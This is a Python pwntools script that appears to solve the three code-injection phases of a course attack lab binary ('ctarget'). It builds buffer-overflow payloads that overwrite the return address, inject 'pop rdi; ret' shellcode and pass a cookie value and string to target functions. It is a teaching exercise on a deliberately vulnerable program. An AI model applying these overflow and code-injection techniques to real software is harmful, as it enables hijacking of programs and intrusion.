from pwn import *

def set_p64(addr):
    return p64(addr).decode("iso-8859-1")

context.clear(arch="amd64")

cookie = 0x59b997fa
touch1 = 0x4017c0
touch2 = 0x4017ec
touch3 = 0x4018fa

ctarget = ["./ctarget", "-q"]

# touch 1
p = process(ctarget)
input("# touch1")

junk_size = 0x28
junk = "a" * 0x28

payload = junk + set_p64(touch1)

p.sendline(payload)
print(str(p.recv(), "ascii"))

# touch 2
p = process(ctarget)
input("# touch2")

input_buf_addr = 0x5561dc78

# pop rdi
# ret

pop_rdi_ret = asm("""pop rdi
                    ret""").decode("iso-8859-1")
junk = "a" * (junk_size - len(pop_rdi_ret))
payload = pop_rdi_ret + junk + set_p64(input_buf_addr) + set_p64(cookie) + set_p64(touch2)

p.sendline(payload)
print(str(p.recv(), "ascii"))

# touch 3
p = process(ctarget)
input("# touch3")

cookie_str = "59b997fa\0"
pop_rdi_ret = asm("""pop rdi
                    ret""").decode("iso-8859-1")
junk = "a" * (junk_size - len(pop_rdi_ret) - len(cookie_str))

cookie_str_addr = input_buf_addr + len(pop_rdi_ret)
payload = pop_rdi_ret + cookie_str + junk + set_p64(input_buf_addr) + set_p64(cookie_str_addr) + set_p64(touch3)


p.sendline(payload)
print(str(p.recv(), "ascii"))
